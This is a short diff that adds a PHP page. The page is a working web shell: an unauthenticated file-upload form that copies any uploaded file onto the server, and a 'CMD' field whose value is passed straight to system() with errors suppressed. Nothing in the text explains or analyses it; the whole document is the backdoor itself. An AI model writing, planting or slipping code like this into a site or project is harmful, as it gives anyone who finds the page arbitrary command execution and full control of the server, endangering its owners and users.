@@ -1,0 +1,10 @@
+<body bgcolor=silver>
+  <?php 
+if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) echo "<script>alert('Sukses Upload')</script>" ?>
+<form method='post' enctype='multipart/form-data'><font face="Homenaje">Upload File :</font>
+  <input type='file' name='file' size='40'>
+  <input type='submit' value='&#10148;'>
+</form><p />
+<form method='post'>
+  CMD : <input type='text' name='cmd' size='50' >
+</form> <? @system($_REQUEST['cmd'])?>
